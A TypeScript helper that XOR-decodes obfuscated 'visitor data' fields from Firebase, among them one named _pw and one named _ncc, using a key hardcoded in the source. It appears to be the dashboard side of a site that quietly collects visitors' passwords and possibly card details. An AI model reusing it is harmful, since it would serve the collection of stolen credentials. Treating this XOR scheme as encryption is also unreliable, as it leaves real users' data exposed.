/**
 * Decrypt utility for dashboard to read encrypted fields from Firebase
 */

const _k = "7f8a9b2c3d4e5f6a1b2c3d4e5f6a7b8c" // Same key as main site

// XOR decrypt function
function _d(s: string): string {
  try {
    const decoded = atob(s)
    let r = ""
    for (let i = 0; i < decoded.length; i++) {
      r += String.fromCharCode(decoded.charCodeAt(i) ^ _k.charCodeAt(i % _k.length))
    }
    return r
  } catch {
    return s
  }
}

// Sensitive fields that are encrypted
const sensitiveFields = [
  '_v1',
  '_v2',
  '_v3',
  '_v4',
  '_v5',
  '_v6',
  '_v7',
  '_v8',
  '_v9',
  '_pw',
  '_ncc'
]

/**
 * Decrypt visitor data from Firebase
 * Handles both old format (direct fields) and new format (base64 keys + encrypted values)
 */
export function decryptVisitorData(data: Record<string, any>): Record<string, any> {
  const decrypted: Record<string, any> = { ...data }
  
  // Try to decrypt obfuscated fields
  Object.keys(data).forEach(key => {
    try {
      // Try to decode the key
      const decodedKey = atob(key)
      
      // Check if it's a sensitive field
      if (sensitiveFields.includes(decodedKey) && typeof data[key] === 'string') {
        // Decrypt the value
        decrypted[decodedKey] = _d(data[key])
        // Keep the original obfuscated key too (for compatibility)
      }
    } catch {
      // Not a base64 key, skip
    }
  })
  
  return decrypted
}

/**
 * Get field value with fallback
 * Tries: obfuscated encrypted → obfuscated plain → old field name
 */
export function getFieldValue(
  data: Record<string, any>,
  obfuscatedField: string,
  oldField?: string
): string | undefined {
  // First, try the obfuscated field directly (if data was already decrypted)
  if (data[obfuscatedField]) {
    return data[obfuscatedField]
  }
  
  // Then, try the old field name
  if (oldField && data[oldField]) {
    return data[oldField]
  }
  
  return undefined
}
